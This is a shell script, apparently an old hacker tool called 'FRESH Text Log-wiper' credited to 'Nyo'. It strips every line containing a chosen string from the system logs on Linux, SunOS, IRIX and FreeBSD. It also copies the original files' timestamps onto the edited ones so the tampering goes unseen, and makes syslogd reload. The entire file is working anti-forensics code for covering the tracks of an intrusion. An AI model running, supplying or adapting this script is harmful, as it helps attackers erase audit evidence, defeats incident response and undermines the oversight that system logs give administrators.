#!/bin/sh
# FRESH Text Log-wiper v1.0
# Coded by Nyo
#
# Support Linux, SunOS, IRIX, FreeBSD

banner()
{
echo "FRESH Text Log-wiper"
echo "Coded by Nyo"
echo
}
banner

if [ $# != 1 ]
then
  echo "Usage: $0 <string>"
  exit
fi

OS=`uname -s`
        # Check if the OS
        case ${OS} in
                Linux)
WERD=`/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "btmp" | grep -v "utmp" | grep -v "wtmp" | grep -v "@"`
		LOGPATH="/var/log"
			;;
		SunOS)
                LOGPATH="/var/adm"
WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
			;;
		IRIX)
                LOGPATH="/var/adm"
WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
                        ;;
		IRIX64)
                LOGPATH="/var/adm"
WERD=`/bin/ls -F $LOGPATH | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "@"`
                        ;;
		FreeBSD)
WERD=`/bin/ls -F /var/log | grep -v "/" | grep -v "*" | grep -v ".tgz" | grep -v ".gz" | grep -v ".tar" | grep -v "lastlog" | grep -v "utmp" | grep -v "wtmp" | grep -v "@"`
		LOGPATH="/var/log"
			;;
		*)
		echo "[!] Your OS is UNKNOWN!"
		exit 0
		exit 10
			;;
                esac

echo "[*] Detected -> $OS"
echo "[*] The string is: $1"
echo
echo "[*] Log cleaning in process ... "

for filez in $WERD
do
   lines=`cat $LOGPATH/$filez | wc -l`
   printf "[-] Cleaning $filez ($lines lines) ... "
   grep -v $1 $LOGPATH/$filez > new
   touch -r $LOGPATH/$filez new
   mv -f new $LOGPATH/$filez
   newlines=`cat $LOGPATH/$filez | wc -l`
   linedel=`expr $lines - $newlines`
   printf "$linedel lines removed!\n"
done
echo
if [ $OS = "Linux" ]
then
echo "[*] Rehashing syslog"
echo
killall -HUP syslogd
fi
echo "[*] Logs successfully wiped!"
echo
exit 0;
